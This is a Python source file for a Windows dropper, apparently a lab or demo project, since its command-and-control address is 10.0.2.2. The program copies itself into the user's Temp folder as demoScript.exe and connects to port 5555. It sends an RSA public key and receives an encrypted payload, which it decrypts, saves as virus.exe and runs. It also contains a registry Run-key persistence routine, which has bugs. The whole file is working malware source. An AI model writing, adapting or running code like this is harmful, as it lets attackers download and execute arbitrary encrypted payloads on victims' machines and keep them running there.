import socket
import os
from os import listdir
from os.path import isfile, join
import subprocess
import time
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import logging
import shutil
import sys
#import winreg as wrg

log = logging.getLogger(__name__)

CYPHERTEXT_LENGTH = 256
CCIP = "10.0.2.2"
CCPORT = 5555
DOWLOADED_FILE_NAME = "virus"

class Cryptography:

    def __init__(self):
        self.keyPair = RSA.generate(2048)
        self.publicKeyPEM = self.keyPair.publickey().exportKey()
        self.manager = PKCS1_OAEP.new(self.keyPair)

    def decrypt(self,cyphertext):
        return self.manager.decrypt(cyphertext)

    def getPublicKey(self):
        return self.publicKeyPEM


class Communication:

    def __init__(self):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def conn(self, CCIP, CCPORT):
        try:
            self.client.connect((CCIP, CCPORT))
            log.info('connected')
        
        except Exception as e:
            log.error(e)

    def send(self, message):
        try:
            self.client.send(message)
            log.debug(f"Sending:\n {message}")

        except Exception as e:
            log.error(e)


    def receive(self, msgSize):
        try:
                while True:
                    data = self.client.recv(msgSize)
                    return data
        except Exception as e:
            log.error(e)


def copyFile():
    log.info("copying script to another folder...")
    
    filename = "demoScript.exe"
    
    

    path = join(os.getenv('LOCALAPPDATA'),"Temp")
    
    if (not isfile(join(path, filename))):
        try:
            log.debug("copying to " + join(path, filename))
            log.debug( 'sys.argv[0] is' + sys.argv[0] )
            shutil.copyfile(sys.argv[0], join(path, filename))
        except Exception as e:
            log.error(e)
    else:
        log.debug("already there ")

def AddToRegistry():
 
    # in python __file__ is the instant of
    # file path where it was executed
    # so if it was executed from desktop,
    # then __file__ will be
    # c:\users\current_user\desktop
    pth = os.path.dirname(os.path.realpath(__file__))
     
    # name of the python file with extension
    s_name=os.path.basename(__file__)    
     
    # joins the file name to end of path address
    address=os.join(pth,s_name)
     
    # key we want to change is HKEY_CURRENT_USER
    # key value is Software\Microsoft\Windows\CurrentVersion\Run
    key = "HKEY_CURRENT_USER"
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
     
    # open the key to make changes to
    open = wrg.OpenKey(key,key_value,0,wrg.KEY_ALL_ACCESS)
     
    # modify the opened key
    wrg.SetValueEx(open,"any_name",0,wrg.wrg_SZ,address)
     
    # now close the opened key
    wrg.CloseKey(open)

    
def saveToFile(data):
    log.info("saving file...")

    savePath = os.path.dirname(sys.argv[0])
    try: 
        with open(os.path.join(savePath, DOWLOADED_FILE_NAME+".exe"), "wb") as file1:
            log.debug(f"writing data in {savePath}")
            file1.write(data)
    except Exception as e:
        log.error(e)
    return savePath


def executePayload(savePath):
    log.info("executing payload...")
    log.debug(join(savePath, DOWLOADED_FILE_NAME+".exe"))
    subprocess.call([join(savePath, DOWLOADED_FILE_NAME+".exe")])


def main():
    logging.basicConfig( 
                        level=logging.DEBUG, 
                        format='%(asctime)s: %(levelname)s, %(message)s' )
    log.info("Starting")

    copyFile()

    communication = Communication()
    crypto = Cryptography()
    
    

    communication.conn(CCIP, CCPORT)

    # SEND MALWARE'S PK
    log.info("sending client public key...")
    communication.send(crypto.getPublicKey())
    
    # RECEIVE ENCRYPTED MESSAGE
    log.info("waiting for payload...")
    chunks = bytearray()
    
    while True:
        encryptedChunk = communication.receive(CYPHERTEXT_LENGTH)
        chunks.extend(encryptedChunk)
        if not encryptedChunk:
            break 

    # DECRYPTING ENCRYPTED MESSAGE 
    log.info("decrypting chunks...")
    PAYLOAD = bytearray()  
    begin = 0
    end = CYPHERTEXT_LENGTH
    lenght = len(chunks)//CYPHERTEXT_LENGTH
    for i in range(lenght):  
        log.debug("decrypting: " + str(i) + "/" + str(lenght))     
        PAYLOAD.extend(crypto.decrypt(chunks[begin:end]))
        begin = end
        end = begin + CYPHERTEXT_LENGTH

    savePath = saveToFile(PAYLOAD)

    executePayload(savePath)    

    while True:
        time.sleep(60)
    

if __name__ == "__main__":
    main()